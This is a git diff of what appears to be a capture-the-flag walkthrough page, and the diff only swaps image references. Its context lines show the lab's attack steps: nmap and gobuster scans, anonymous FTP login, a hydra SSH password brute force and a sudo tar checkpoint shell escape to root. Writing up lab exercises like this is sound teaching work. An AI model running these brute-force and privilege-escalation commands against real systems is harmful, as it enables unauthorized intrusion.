@@ -11,7 +11,7 @@
 <pre><code><strong>nmap -A $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
 ### Scan all ports
 
@@ -26,7 +26,7 @@ No other ports found.
 gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt 
 ```
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 ### TCP/22 - SSH&#x20;
 
@@ -39,7 +39,7 @@ ftp $VICTIM
 Username: anonymous
 ```
 
-<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -47,7 +47,7 @@ Username: anonymous
 hydra -l lin -P locks.txt ssh://$VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 ```
 Username: lin
@@ -70,7 +70,7 @@ ssh lin@$VICTIM
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
 
 
 
